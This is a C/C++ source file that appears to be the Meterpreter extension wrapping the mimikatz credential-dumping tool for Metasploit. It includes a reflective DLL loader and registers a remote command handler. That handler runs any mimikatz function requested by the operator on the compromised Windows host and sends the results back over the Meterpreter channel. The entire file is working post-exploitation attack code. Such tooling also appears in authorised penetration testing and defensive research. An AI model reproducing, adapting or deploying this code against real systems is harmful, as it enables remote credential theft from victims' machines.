/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "main.h"

// Moved this from the extern C section as it's clearly C++ related.
std::wstring s2ws(const std::string& str)
{
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo( size_needed, 0 );
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

extern "C"
{
#include "common_metapi.h"

	// Required so that use of the API works.
	MetApi* met_api = NULL;

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

	mimikatz* myMimiKatz;

	// Singleton
	void initialize_mimikatz()
	{
		vector<wstring>* args;
		if (!myMimiKatz)
		{
			args = new vector<wstring>();
			myMimiKatz = new mimikatz(args);
			delete args;
		}
	}

	void clear_buffer()
	{
		oss.str(L"");
		oss.clear();
	}

	wchar_t* convert_wstring_to_wchar_t(wstring in)
	{
		const wchar_t* outputStr = in.c_str();
		wchar_t* out = new wchar_t[in.size() + 1];
		wcscpy_s(out, in.size() + 1, outputStr);
		out[in.size()] = '\0';
		return out;
	}

	DWORD request_custom_command(Remote* remote, Packet* packet)
	{
		Packet* response = met_api->packet.create_response(packet);
		Tlv argTlv = { 0 };
		DWORD index = 0;
		vector<wstring> args;

		LPCSTR func = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_MIMIKATZ_FUNCTION);
		dprintf("Function: %s", met_api->packet.get_tlv_value_string(packet, TLV_TYPE_MIMIKATZ_FUNCTION));
		wstring function = s2ws(func);

		while (met_api->packet.enum_tlv(packet, index++, TLV_TYPE_MIMIKATZ_ARGUMENT, &argTlv) == ERROR_SUCCESS)
		{
			dprintf("Arg: %s", (PCHAR)argTlv.buffer);
			args.push_back(s2ws((PCHAR)argTlv.buffer));
		}

		clear_buffer();

		initialize_mimikatz();
		myMimiKatz->doCommandeLocale(&function, &args);

		wchar_t* output = convert_wstring_to_wchar_t(oss.str());

		clear_buffer();

		met_api->packet.add_tlv_raw(response, TLV_TYPE_MIMIKATZ_RESULT, output, (DWORD)(wcslen(output) * sizeof(wchar_t)));
		met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

		return ERROR_SUCCESS;
	}

	Command customCommands[] =
	{
		COMMAND_REQ("mimikatz_custom_command", request_custom_command),
		COMMAND_TERMINATOR
	};

	/*!
	 * @brief Initialize the server extension.
	 * @param api Pointer to the Meterpreter API structure.
	 * @param remote Pointer to the remote instance.
	 * @return Indication of success or failure.
	 */
	DWORD InitServerExtension(MetApi* api, Remote* remote)
	{
		met_api = api;

		met_api->command.register_all(customCommands);

		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Deinitialize the server extension.
	 * @param remote Pointer to the remote instance.
	 * @return Indication of success or failure.
	 */
	DWORD DeinitServerExtension(Remote* remote)
	{
		met_api->command.deregister_all(customCommands);

		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Get the name of the extension.
	 * @param buffer Pointer to the buffer to write the name to.
	 * @param bufferSize Size of the \c buffer parameter.
	 * @return Indication of success or failure.
	 */
	DWORD GetExtensionName(char* buffer, int bufferSize)
	{
		strncpy_s(buffer, bufferSize, "mimikatz", bufferSize - 1);
		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Do a stageless initialisation of the extension.
	 * @param buffer Pointer to the buffer that contains the init data.
	 * @param bufferSize Size of the \c buffer parameter.
	 * @return Indication of success or failure.
	 */
	DWORD StagelessInit(const LPBYTE buffer, DWORD bufferSize)
	{
		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Callback for when a command has been added to the meterpreter instance.
	 * @param commandName The name of the command that has been added.
	 */
	VOID CommandAdded(const char* commandName)
	{
	}
}
